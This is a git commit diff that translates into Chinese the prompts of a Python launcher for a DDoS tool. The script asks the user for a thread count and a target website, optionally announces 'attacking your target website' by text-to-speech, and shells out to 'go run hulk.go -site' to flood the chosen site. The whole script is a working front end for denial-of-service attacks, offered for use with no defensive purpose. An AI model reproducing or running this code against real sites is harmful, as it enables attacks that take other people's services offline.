8cebcef035e13e9bcde0c764d9bf197ef1759029
E-hydrogen <89262123+E-hydrogen@users.noreply.github.com>
2021-11-19 13:16:41 +0800

    完成了汉化
    好耶！

--- Python-Script.py
+++ Python-Script.py
@@ -31,26 +31,26 @@ print(Fore.RED + '翻译者B站： ' + Fore.GREEN + 'https://space.bilibili.com/
 print(Fore.YELLOW + '翻译者GitHub：' + Fore.GREEN + 'https://github.com/E-hydrogen')
 print('你的系统'+ Fore.RED + str(platform.system())+Fore.GREEN)
 try:
-    threads = input('[+] ENTER THE NUMBER OF' + Fore.BLUE + ' THREADS ' + Fore.GREEN + 'FOR DDoS >>>')
-    site = input(Fore.BLUE + '[+] Enter the Site that You want to' + Fore.RED + ' DDoS ' + Fore.GREEN + '>>>')
-    colab_status = input(Fore.YELLOW + 'Are you DDoS with Google Collab [Y/N]')
-    attack_severity = input('[+] Enter'+ Fore.RED +' 1'+Fore.GREEN+' For a Very Small'+Fore.RED+' Target'+Fore.GREEN+' Like a Device and' + Fore.YELLOW + ' 2 ' + Fore.GREEN +' for a ' + Fore.YELLOW + 'Website '+ Fore.GREEN + ' >>>')
+    threads = input('[+] 请输入DDoS的' + Fore.BLUE + '线程' + Fore.GREEN + '>>>')
+    site = input(Fore.BLUE + '[+] 请输入你有' + Fore.RED + 'DDoS' + Fore.GREEN + '的网站>>>')
+    colab_status = input(Fore.YELLOW + '你要使用Google Collab DDoS吗？[Y/N]')
+    attack_severity = input('[+] 输入'+ Fore.RED +' 1'+Fore.GREEN+'一个很小的'+Fore.RED+'目标'+Fore.GREEN+'就比如一个装置' + Fore.YELLOW + ' 2 ' + Fore.GREEN +'一个' + Fore.YELLOW + '网站'+ Fore.GREEN + '>>>')
     if 'Y' == colab_status:
-        print('OK, Now Not using Text-to-Speech to make ur Attack look' + Fore.RED+ ' Cool' + Fore.GREEN)
+        print('好的，现在请不要使用文本到语音，让你的攻击看起来很' + Fore.RED+ '酷' + Fore.GREEN)
     if 'y' == colab_status:
-        print('OK, Now Not using Text-to-Speech to make ur Attack look' + Fore.RED+ ' Cool' + Fore.GREEN)
+        print('好的，现在请不要使用文本到语音，让你的攻击看起来很' + Fore.RED+ '酷' + Fore.GREEN)
     if 'n' == colab_status:
         if str(platform.system()) == 'Linux':
-            print('[+] As You are on Linux, No, Text-to-Speech')
+            print('[+] 就像你在Linux上一样，不要使用文本到语音')
         else:
-            say_stuff("Attacking your Target Website {0} with {1} Threads".format(site, threads))
+            say_stuff("使用{1}线程攻击目标网站{0}".format(site, threads))
     if 'N' == colab_status:
         if str(platform.system()) == 'Linux':
-            print('[+] As you are on Linux, No, Text-to-Speech')
+            print('[+] 就像你在Linux上一样，不要使用文本到语音')
         else:
-            say_stuff("Attacking your Target Website {0} with {1} Threads".format(site, threads))
+            say_stuff("使用{1}线程攻击目标网站{0}".format(site, threads))
 
-    print('[+] Executing Command as Follows')
+    print('[+] 执行以下命令')
     print(Fore.GREEN +'HULKMAXPROCS={0} go run hulk.go -site {1}'.format(threads,site))
     if 'Windows' in str(platform.system()):
         os.system('go run hulk.go -site {0}'.format(site))
@@ -59,8 +59,8 @@ try:
     print(Back.BLACK + Fore.GREEN)
     
 except:
-    print('[+] Execution Stopped with Error Code 0, Install GoLang or Your Internet is not working properly')
-    print('[+] Installing Dependancies')
+    print('[+] 执行已停止，错误代码为0，请安装GoLang，否则您的Internet无法正常工作')
+    print('[+] 安装依赖项')
     os.system('python3 Install_Dependancies.py')
     os.system('python Install_Dependancies.py')
     os.system('py Install_Dependancies.py')
